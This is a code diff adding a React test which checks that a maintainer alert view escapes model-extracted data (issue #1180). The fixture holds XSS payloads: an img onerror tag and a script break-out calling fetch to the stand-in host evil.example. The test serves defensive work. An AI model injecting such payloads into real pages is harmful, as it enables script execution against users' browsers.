@@ -200,4 +200,37 @@ describe("MaintainerAlertDetail", () => {
     expect(html).toContain("formato no reconocido");
     expect(html).toContain("calculation_trace");
   });
+
+  test("renders extractedData as escaped TEXT, never as raw HTML (#1180)", () => {
+    // The extraction is model-written from a user-supplied document, so it is
+    // untrusted input reaching a maintainer's browser. It must arrive as text.
+    const hostile = {
+      ...PAYLOAD,
+      extractedData: {
+        nota: "<img src=x onerror=alert(1)>",
+        script: "</pre><script>fetch('//evil.example')</script>",
+      },
+    } satisfies MaintainerAlertPayload;
+
+    const html = renderToStaticMarkup(
+      MaintainerAlertDetail({
+        alert: alert({
+          occurrences: [
+            { id: "occ-1", payload: hostile, occurredAt: "2026-07-15T10:00:00.000Z" },
+          ],
+        }),
+      }),
+    );
+
+    expect(html).toContain("Datos extraídos del documento");
+    // Escaped, so the browser sees characters and not tags.
+    expect(html).toContain("&lt;img src=x onerror=alert(1)&gt;");
+    expect(html).toContain("&lt;/pre&gt;&lt;script&gt;");
+    expect(html).not.toContain("<img src=x");
+    // React's own form-replay <script> is in the markup, so assert on the
+    // injected content rather than on the tag name.
+    expect(html).not.toContain("<script>fetch(");
+    expect(html).not.toContain("evil.example</");
+    expect(html).not.toContain("dangerouslySetInnerHTML");
+  });
 });
